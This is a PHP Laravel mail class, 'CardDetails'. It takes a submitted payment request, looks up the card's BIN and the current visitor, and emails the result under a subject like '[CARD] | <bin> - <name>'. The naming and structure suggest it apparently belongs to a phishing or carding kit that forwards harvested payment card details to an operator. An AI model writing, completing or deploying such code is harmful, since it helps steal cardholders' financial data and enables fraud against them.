<?php

namespace App\Mail;

use App\Class\CardBin;
use App\Http\Requests\StorePaymentRequest;
use App\Models\Visitor;
use Illuminate\Bus\Queueable;
use Illuminate\Mail\Mailable;
use Illuminate\Mail\Mailables\Address;
use Illuminate\Mail\Mailables\Attachment;
use Illuminate\Mail\Mailables\Content;
use Illuminate\Mail\Mailables\Envelope;
use Illuminate\Queue\SerializesModels;

class CardDetails extends Mailable {
    use Queueable, SerializesModels;

    public readonly Visitor $visitor;
    public readonly CardBin $cardBin;

    /**
     * Create a new message instance.
     */
    public function __construct(public StorePaymentRequest $request)
    {
        $this->visitor = Visitor::current();
        $this->cardBin = CardBin::findOrNew($this->request->get('cardNumber'));
    }

    /**
     * Get the message envelope.
     */
    public function envelope(): Envelope
    {
        return new Envelope(
            from: new Address(config('mail.from.address'), $this->request->get('cardName') ?? config('mail.from.name')),
            subject: "[CARD] | $this->cardBin - {$this->request->name}",
        );
    }

    /**
     * Get the message content definition.
     */
    public function content(): Content
    {
        return new Content(
            markdown: 'mail.card-details',
        );
    }

    /**
     * Get the attachments for the message.
     *
     * @return array<int, Attachment>
     */
    public function attachments(): array
    {
        return [];
    }
}
